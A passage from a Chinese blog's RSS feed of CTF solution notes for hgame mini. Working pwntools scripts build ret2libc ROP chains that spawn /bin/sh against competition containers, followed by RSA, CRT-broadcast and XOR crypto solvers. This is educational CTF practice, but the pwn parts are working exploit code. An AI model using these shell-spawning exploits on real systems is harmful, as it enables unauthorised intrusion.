class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;../vuln&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;1.container.jingsai.apicon.cn&#x27;</span>,<span class="number">31547</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">duiqi = <span class="number">0x40101A</span></span><br><span class="line">rdi = <span class="number">0x4012C3</span></span><br><span class="line">got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x40120B</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;By the way, I removed the system function this time.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span></span><br><span class="line">p += p64(rdi) + p64(got)                                       </span><br><span class="line">p += p64(plt)                           </span><br><span class="line">p += p64(main_addr)                  </span><br><span class="line"></span><br><span class="line">sh.sendline(p)</span><br><span class="line">haha=sh.recv(<span class="number">96</span>)</span><br><span class="line"><span class="built_in">print</span>(haha)</span><br><span class="line">myaddr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(myaddr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;By the way, I removed the system function this time.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = LibcSearcher(&quot;write&quot;,myaddr)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;../libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libcbase = myaddr - libc.dump(&quot;write&quot;)</span></span><br><span class="line">libcbase = myaddr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys_addr=libcbase+libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#bin_sh=libcbase+libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line">sys_addr = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#next以将生成器转化为整数，与整数libcbase相加</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">32</span>+<span class="number">8</span>)+ p64(duiqi) +p64(rdi) + p64(bin_sh)+ p64(sys_addr) </span><br><span class="line"></span><br><span class="line">sh.sendline(p1)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="2-分析"><a href="#2-分析" class="headerlink" title="2.分析"></a>2.分析</h4><h5 id="文件："><a href="#文件：" class="headerlink" title="文件："></a>文件：</h5><p>一个vuln, 一个libc</p><h5 id="checksec："><a href="#checksec：" class="headerlink" title="checksec："></a>checksec：</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>保护很弱，有NX，可以ROP</p><h5 id="IDA"><a href="#IDA" class="headerlink" title="IDA:"></a>IDA:</h5><p>system被移走了，要用ROP</p><h5 id="ROPgadget："><a href="#ROPgadget：" class="headerlink" title="ROPgadget："></a>ROPgadget：</h5><p>发现rdi</p><h4 id="3-反思"><a href="#3-反思" class="headerlink" title="3.反思"></a>3.反思</h4><p>1.libcSearch找不到匹配文件，因此用题目提供的本地文件。</p><p>2.溢出的字符串存在于vuln的栈帧中，所以ROP的内容是在vuln结束执行之后才调用的</p><p>（非常重要！！就因为这个我卡了这么久！！！）</p><p>3.如果程序开启了ASLR的保护机制，每次泄露的地址就会变</p><p>4.泄露用的函数不一定要是write（容易出错），只要是IDA中有的function都是可以用的，比如puts，和用什么输出无关。</p><h2 id="Introduce-yourself-again——pwn"><a href="#Introduce-yourself-again——pwn" class="headerlink" title="Introduce yourself again——pwn"></a>Introduce yourself again——pwn</h2><p><em>date：20230827</em></p><p><strong>注：比较懒，这篇记录就不作详细解析了</strong></p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = ELF(<span class="string">&#x27;../vuln&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;1.container.jingsai.apicon.cn&#x27;</span>,<span class="number">31583</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果 /bin/sh 在你的二进制文件或 libc 中</span></span><br><span class="line">binsh_addr = <span class="built_in">next</span>(binary.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="comment"># next用于将迭代器转化为地址。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果你的二进制文件导入了 system 函数，否则你需要从 libc 中找到它</span></span><br><span class="line">system_addr = binary.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造ROP链</span></span><br><span class="line">rop_chain = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span>  <span class="comment"># 填充缓冲区（32+8）</span></span><br><span class="line">rop_chain += p64(<span class="number">0x401283</span>)  <span class="comment"># pop rdi ; ret 的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># return到了rdi之后，转到&#x27;system(&#x27;/bin/sh&#x27;)&#x27;</span></span><br><span class="line">rop_chain += p64(binsh_addr)         <span class="comment"># /bin/sh 的地址</span></span><br><span class="line">rop_chain += p64(system_addr)        <span class="comment"># system 函数的地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(rop_chain)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ez-RSA——cypto"><a href="#ez-RSA——cypto" class="headerlink" title="ez_RSA——cypto"></a>ez_RSA——cypto</h2><p><img src="/images/1.png" alt="1"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> isqrt, invert</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime</span><br><span class="line"></span><br><span class="line">n = <span class="number">90938392456291254525076945024729747747760465730974669418706248227861886309375529663735627415245417634394729586919547147792773340180198391198314430274518933727253498184961383171260516587457792799707287325039224408079898775410581161837617160304998792211064631247289074677708936697313549567484094343014332084339</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">45364797306235971944260226800635151351008146862295270630931485461400677931474845001179392584827173887899973869918030404844235023951265629425837039670402124263530793496501526611946694844071734068320021250788698711162051512227685780168559259017820474609757591818839612837707915716391578907729532072964242156512</span></span><br><span class="line"></span><br><span class="line">x = isqrt(n)</span><br><span class="line"><span class="comment"># 一个开平方整数</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> (isprime(x) <span class="keyword">and</span> isprime(n//x)):</span><br><span class="line">    x-=<span class="number">1</span></span><br><span class="line">p = x</span><br><span class="line">q = n // x</span><br><span class="line"><span class="comment"># “//” 是整除</span></span><br><span class="line"><span class="comment"># 保证p和q也是素数</span></span><br><span class="line"></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="comment"># ϕ(n)=(p−1)(q−1)</span></span><br><span class="line"></span><br><span class="line">d = invert(e, phi_n)</span><br><span class="line"><span class="comment">#d 为 e 关于模 ϕ(n) 的逆元</span></span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert the number to bytes</span></span><br><span class="line">b_res = m.to_bytes((m.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="comment"># -&gt;结果 = m转化为字节形式(位长 + 7 // 8 = 字节长度，大端模式)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Decode the bytes to a string using UTF-8 encoding</span></span><br><span class="line">str_res = b_res.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str_res)</span><br></pre></td></tr></table></figure><h2 id="modulus——crypto"><a href="#modulus——crypto" class="headerlink" title="modulus——crypto"></a>modulus——crypto</h2><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的值写在这里，由于太多就省略了</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用中国剩余定理求解C</span></span><br><span class="line">N = n1 * n2 * n3</span><br><span class="line">N1 = N // n1</span><br><span class="line">N2 = N // n2</span><br><span class="line">N3 = N // n3</span><br><span class="line">u1 = inverse(N1, n1)</span><br><span class="line">u2 = inverse(N2, n2)</span><br><span class="line">u3 = inverse(N3, n3)</span><br><span class="line"></span><br><span class="line">C = (c1 * u1 * N1 + c2 * u2 * N2 + c3 * u3 * N3) % N</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用牛顿法来近似计算C^(1/e)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nth_root</span>(<span class="params">x, n</span>):</span><br><span class="line">    getcontext().prec = <span class="number">100</span>  <span class="comment"># 设置很高的精度</span></span><br><span class="line">    guess = Decimal(x)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        better_guess = ((n - <span class="number">1</span>) * guess + x / guess**(n - <span class="number">1</span>)) / n</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(guess - better_guess) &lt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> +better_guess</span><br><span class="line">        guess = better_guess</span><br><span class="line"></span><br><span class="line">m_recovered = nth_root(C, e)</span><br><span class="line">flag_recovered = long_to_bytes(<span class="built_in">int</span>(m_recovered))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag_recovered)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的值写在这里，由于太多就省略了</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_flag</span>(<span class="params">c, n, e</span>):</span><br><span class="line">    N = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> ni <span class="keyword">in</span> n:</span><br><span class="line">        N *= ni</span><br><span class="line"></span><br><span class="line">    residues = [(N // ni) * inverse(N // ni, ni) <span class="keyword">for</span> ni <span class="keyword">in</span> n]</span><br><span class="line">    C = <span class="built_in">sum</span>([ci * ri <span class="keyword">for</span> ci, ri <span class="keyword">in</span> <span class="built_in">zip</span>(c, residues)]) % N</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">nth_root</span>(<span class="params">x, n</span>):</span><br><span class="line">        getcontext().prec = <span class="number">100</span></span><br><span class="line">        guess = Decimal(x)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            new_guess = ((n - <span class="number">1</span>) * guess + x / guess**(n - <span class="number">1</span>)) / n</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(guess - new_guess) &lt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> +new_guess</span><br><span class="line">            guess = new_guess</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(<span class="built_in">int</span>(nth_root(C, e)))</span><br><span class="line"></span><br><span class="line">c = [c1, c2, c3]</span><br><span class="line">n = [n1, n2, n3]</span><br><span class="line"><span class="built_in">print</span>(recover_flag(c, n, <span class="number">17</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/2.jpg" alt="2"></p><p><img src="/images/3.jpg" alt="3"></p><h2 id="XOR——crypto"><a href="#XOR——crypto" class="headerlink" title="XOR——crypto"></a>XOR——crypto</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = <span class="string">b&#x27;\x89\x86\x17\x02RB\x87\xff\x01\x1c1J\x80\xae\x0c1eO\xba\xbd`*bU\xba\x90c3eK\xbe\xbb:,nD&#x27;</span></span><br><span class="line">known_prefix = <span class="string">b&quot;VIDAR&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Recover the key from the known prefix</span></span><br><span class="line">key = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(known_prefix)):</span><br><span class="line">    key.append(known_prefix[i] ^ enc[i])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now you have the first few bytes of the key. Let&#x27;s attempt to decrypt the rest of the message.</span></span><br><span class="line"><span class="comment"># As the key is only 6 bytes, we need only the first 6 bytes to decrypt the entire message.</span></span><br><span class="line"></span><br><span class="line">decrypted = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    decrypted.append(enc[i] ^ key[i % <span class="number">6</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted)</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">CTF做题记录</category>
      
      
      <comments>https://cjliblog.top/2023/08/27/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bhgame%20mini/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
